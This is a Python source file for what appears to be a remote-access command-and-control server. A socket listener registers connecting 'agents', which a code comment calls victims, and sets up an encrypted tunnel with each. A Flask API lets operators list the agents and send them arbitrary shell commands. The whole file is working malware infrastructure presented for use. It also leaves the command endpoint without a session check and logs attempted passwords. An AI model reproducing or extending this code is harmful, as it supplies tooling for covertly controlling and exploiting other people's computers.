import rsa
import zlib
import uuid
import hashlib
import tomllib
import threading
import time
import socket
import select
import argparse
import logging

from flask import Flask, request, jsonify
from dataclasses import dataclass

from lib import logger, http
from lib.http import HTTP_SESSION
from lib.crypto import EncryptedTunnel, get_hwid

# TODO: "alive connection" check

@dataclass
class ServerConfig:
    FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
    BUFSIZE: int

    # { addr: [FINGERPRINT, PCNAME, obj(EncryptedTunnel)]}
    AGENTS: dict

# ----> [ CLI parsing ] <----

parser = argparse.ArgumentParser()
parser.add_argument("--ssl", action="store_true", help="Enable HTTPS")
parser.add_argument("-v", "--verbose", action="store_true")

# --- [ Init variables ] ---

CURRENT_DIR = "/".join(__file__.split("/")[:-1])
CONFIG      = tomllib.load(open(CURRENT_DIR + "/config/config.toml", "rb"))


app_api      = Flask(__name__)
http_session = HTTP_SESSION()
server_cfg   = ServerConfig(1024, {})

try:
    WHITELIST            = CONFIG.get("whitelist")
    HTTP_IP, HTTP_PORT   = CONFIG.get("http").get("host").split(":")
    AGENT_IP, AGENT_PORT = CONFIG.get("agent").get("host").split(":")
except Exception as e:
    print(e)

def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
    
    # >>> [ ACCESS ] <<<
    
    @app_api.route("/access", methods=["POST"])
    def access():
        json_body: dict = request.get_json()
        
        USERNAME: str = json_body["username"]
        PASSWORD: str = json_body["password"]

        if USERNAME in WHITELIST:

            password_whitelist_hashed = hashlib.sha256(WHITELIST[USERNAME].encode()).hexdigest()

            if PASSWORD == password_whitelist_hashed:
                # Generate & add session
                session = http_session.add_session(request.remote_addr)
                
                logger.info(f"New client connected: {request.remote_addr}")
                return jsonify({"session": session[1]})
            else:
                logger.info(f"{request.remote_addr}: failed to authenticate ({USERNAME}:{PASSWORD})")
                return jsonify({"error": "Username of password invalid"}), 401
    
        else:
            logger.info(f"{request.remote_addr}: failed to authenticate ({USERNAME}:{PASSWORD})")
            return jsonify({"error": "Username or password invalid"}), 401

     # >>> [ GET_AGENTS ] <<<
    
    @app_api.route("/get_agents/<session>")
    def send_agents(session):

        if http_session.exist(request.remote_addr, session):
            
            # Add agents fingerprint into `agents_fingerprint`
            agents_info: list[list] = []
            for agent in server_cfg.AGENTS:
                FINGERPRINT = server_cfg.AGENTS[agent][0].decode()
                PCNAME = server_cfg.AGENTS[agent][1]   
                
                agents_info.append([agent, FINGERPRINT, PCNAME])

            logger.info(f"{request.remote_addr}: list of agents sent ({session})")
            return jsonify(agents_info)
        
        else:
            logger.info(f"{request.remote_addr}: invalid session ({session})")
            return jsonify({"error": "Invalid session"})

    # >>> [ EXIST_AGENT ] <<<

    @app_api.route("/exist_agent", methods=["POST"])
    def check_agent_exist():
        json_body = request.json

        SESSION = json_body["session"]
        AGENT_FINGERPRINT = json_body["fingerprint"]

        if http_session.exist(request.remote_addr, SESSION):
            agent_addr = http.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
            
            return jsonify({"exist": not (agent_addr is None), "addr": agent_addr})

    # >>> [ SEND_COMMAND ] <<<

    @app_api.route("/send_command", methods=["POST"])
    def agent_command():
        json_body: dict = request.get_json()
        
        COMMAND: bytes = json_body["command"].encode()
        AGENT_FINGERPRINT: str = json_body["fingerprint"]

        if len(COMMAND) <= 0:
            return

        agent_addr = http.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)

        if not (agent_addr is None):
            s: EncryptedTunnel = server_cfg.AGENTS[agent_addr][2]
            
            try:
                logger.info(f"sending ({COMMAND}) command to {agent_addr}")             
                s.send(COMMAND)

                logger.info("command sended") 

                command_output = s.recv_big(server_cfg.BUFSIZE).decode()
                return jsonify({"output": command_output})
            
            except Exception as e:
                logger.error(f"sending command failed: {agent_addr}")
                return jsonify({"error": str(e)}), 408
        
        else:
            logger.info(f"failed finding agent ({request.remote_addr}): {AGENT_FINGERPRINT}")
            return jsonify({"error": "This agent don't exist"}), 403
            
    # --- [ Start HTTP(s) server ] ---

    if len(ssl_context) > 0:
        app_api.run(host, port, debug, ssl_context = ssl_context)
    else:
        app_api.run(host, port, debug)

def handle_agents(client_socket: socket.socket, client_addr: tuple):
    formated_peername = client_addr[0] + ':' + str(client_addr[1])

    # Get a fingerprint (random string)
    fingerprint = client_socket.recv(server_cfg.BUFSIZE)

    logger.info(f"Agent connected {client_addr}/{fingerprint}")

    # Generate rsa keys
    # will be used for key exchange + nonce to start communicating only with Salsa20
    # (which allows its larger data exchange)
    public_key, private_key = rsa.newkeys(1024) 
    public_key_pem = rsa.PublicKey.save_pkcs1(public_key)

    client_socket.send(public_key_pem)

    # Gets the RSA-encrypted string containing the key and nonce
    decrypted = rsa.decrypt(client_socket.recv(server_cfg.BUFSIZE), private_key)
    decompressed = zlib.decompress(decrypted)
    
    key, nonce = decompressed.split(b"<SPR>")

    # Memory free
    del(decrypted)
    del(decompressed)

    enctunnel = EncryptedTunnel(client_socket, key, nonce)

    # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
    server_cfg.AGENTS[formated_peername] = [fingerprint, "pcname", enctunnel]

def server_agents(ip: str, port: int):
    server_socket = socket.socket()
    server_socket.bind((ip, port))
    server_socket.listen(-1)
    
    while True:
        client, addr = server_socket.accept()
        threading.Thread(target=handle_agents, args=(client, addr)).start()

def main():
    args = parser.parse_args()
    logger.debug(f"arguments: {args}")

    # Disable Flask printing
    logging.getLogger("werkzeug").disabled = True

    # Open multiple server
    server_thread_agents = threading.Thread(target=server_agents, args=(AGENT_IP, int(AGENT_PORT)))
    logger.info(f"Socket server opened: {AGENT_IP}:{AGENT_PORT}")

    if args.ssl:
        https_files = (CURRENT_DIR + "/config/website.crt", CURRENT_DIR + "/config/private.key")
        logger.debug(f"SSL: {https_files}")
    
    else:
        https_files = ()

    server_thread_api = threading.Thread(target=server_api, args=(HTTP_IP, HTTP_PORT, False, https_files))
    logger.info(f"HTTP server opened: {HTTP_IP}:{HTTP_PORT}")

    # Start threads
    server_thread_agents.start()
    server_thread_api.start()

if __name__ == "__main__":
    main()